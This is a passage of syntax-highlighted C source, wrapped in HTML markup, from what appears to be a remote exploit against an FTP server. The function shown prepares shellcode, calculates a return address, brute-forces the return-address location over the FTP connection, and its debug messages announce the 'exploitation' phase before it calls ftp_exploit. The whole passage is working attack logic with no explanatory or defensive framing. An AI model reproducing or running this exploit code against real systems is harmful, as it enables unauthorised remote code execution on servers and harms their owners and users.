    </span><span class="sc11">FTP_shellcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">shellcode_read</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FTP_shellcode</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode2</span><span class="sc10">);</span><span class="sc0">    
    </span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">511</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">ffpad</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 6 - calculating return address...  \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 7 - getting return address location...  \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">flipcoin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">retloc_maxsearch</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">content</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">xp_retloc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_dstaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">retloc_midhit</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">flipcoin</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">flipcoin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">flipcoin</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">flipcoin</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">esc_ok</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_retloc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_findrl</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xp_retloc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">retaddr_low</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">retaddr_high</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x7350</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 8 - exploitation...  \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">ftp_exploit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vuln</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc10">}</span></div></body>
</html>
